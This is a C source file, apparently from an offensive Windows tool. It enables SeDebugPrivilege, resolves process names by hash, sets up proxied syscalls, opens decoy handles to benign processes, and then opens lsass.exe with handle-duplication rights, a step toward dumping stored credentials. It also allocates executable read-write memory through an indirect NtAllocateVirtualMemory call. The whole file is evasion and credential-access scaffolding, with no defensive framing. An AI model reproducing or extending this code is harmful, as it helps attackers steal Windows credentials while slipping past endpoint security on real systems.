#include "Common.h"
#pragma comment (lib, "shell32.lib")

INSTANCE _Instance = {NULL};
PINSTANCE Instance = &_Instance;

HELPER _Helper  = {NULL};
PHELPER pHelper = &_Helper;

int main() {
    PVOID   pAddress  = NULL;
    SIZE_T  memSize   = 4096;


    DWORD   dwLSASSId = 0;
    HANDLE  hLSASS    = NULL;
    DWORD   dwDummyLSASSId = 0;
    HANDLE  hDummyLSASS    = NULL;


    ULONG procArray[] = {
            HASHW(L"ctfmon.exe"),
            HASHW(L"fontdrvhost.exe"),
            HASHW(L"StartMenuExpericenHost.exe")
    };

    HANDLE handleArray[sizeof(procArray)];

    AddWin32uToIat();
    if (!InitSyscalls()) {
        return 0;
    }

    if (!SetSeDebugPrivilege()) {
        printf("[!] Failed to set SeDebugPrivilege\n");
    }

    for (DWORD i = 0; i < (sizeof(procArray) / sizeof(procArray[0])); ++i) {
        DWORD dwTmp = 0;
        handleArray[i] = NULL;
        OpenProcessHandle(procArray[i], &dwTmp, &handleArray[i], PROCESS_QUERY_INFORMATION);
    }

    OpenProcessHandle(HASHW(L"lsass.exe"), &dwDummyLSASSId, &hDummyLSASS, PROCESS_QUERY_INFORMATION);

    if (!OpenProcessHandle(HASHW(L"lsass.exe"), &dwLSASSId, &hLSASS, PROCESS_DUP_HANDLE)) {
        printf("[!] Failed to get process handle\n");
    }

    Instance->Win32.Api.NtAllocateVirtualMemory.ProxyCall(
            U_PTR(NtCurrentProcess()),
            U_PTR(&pAddress),
            U_PTR(NULL),
            U_PTR(&memSize),
            U_PTR((MEM_COMMIT|MEM_RESERVE)),
            U_PTR(PAGE_EXECUTE_READWRITE)
            );

    printf("Memory allocated at: %p\n", pAddress);
    getchar();

    return 0;
}